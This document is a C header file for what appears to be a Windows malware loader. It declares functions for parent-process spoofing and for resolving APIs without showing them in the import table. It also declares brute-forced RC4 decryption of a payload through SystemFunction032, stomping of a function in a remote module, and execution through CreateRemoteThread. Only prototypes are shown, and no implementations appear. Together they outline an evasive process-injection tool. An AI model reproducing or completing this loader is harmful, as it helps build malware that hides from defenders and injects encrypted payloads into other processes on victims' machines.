#pragma once
#undef UNICODE
#include <windows.h>
#include <tlhelp32.h>
#include <ctype.h>
#include <stdio.h>
#include <winternl.h>

// Spoofer
BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID);
BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);

// IAT utils
FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName);
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);

typedef VOID (*f_WaitForSingleObject)(HANDLE, DWORD);
typedef HANDLE(*f_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(*f_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(*f_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);

// RC4
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
);
BYTE BruteDecryption(IN BYTE bFirstByte, IN PBYTE pEncrypted, IN SIZE_T sEncrypted, OUT PBYTE* pDecrypted);
BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);

// Stomper
PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize);

// Execution
VOID RemoteThreadExecute(IN HANDLE hProcess, IN PVOID pAddress);